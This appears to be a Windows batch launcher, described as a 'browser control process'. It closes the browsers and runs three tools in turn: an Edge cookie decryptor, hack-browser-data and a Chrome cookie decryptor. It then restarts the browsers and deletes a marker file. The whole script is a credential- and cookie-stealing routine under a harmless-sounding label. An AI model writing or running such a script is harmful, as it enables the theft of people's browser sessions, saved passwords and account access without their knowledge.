@echo off
setlocal EnableDelayedExpansion
cd "%~dp0"

echo Starting browser control process...
echo Running from directory: %CD%

REM Run stop_browsers
call stop_browsers.bat

REM Brief wait for browsers to close
timeout /t 3 /nobreak

echo Running applications sequentially...

REM Run each exe immediately after the previous one finishes

"%CD%\edge_cookie_decryptor.exe"
timeout /t 1 /nobreak

"%CD%\hack-browser-data.exe"
timeout /t 1 /nobreak

"%CD%\chrome_cookie_decryptor.exe"
timeout /t 1 /nobreak



REM Quick final wait
timeout /t 1 /nobreak

REM Start browsers
call start_browsers.bat

REM Signal completion
del /F /Q "%CD%\running.tmp"
echo Process completed.
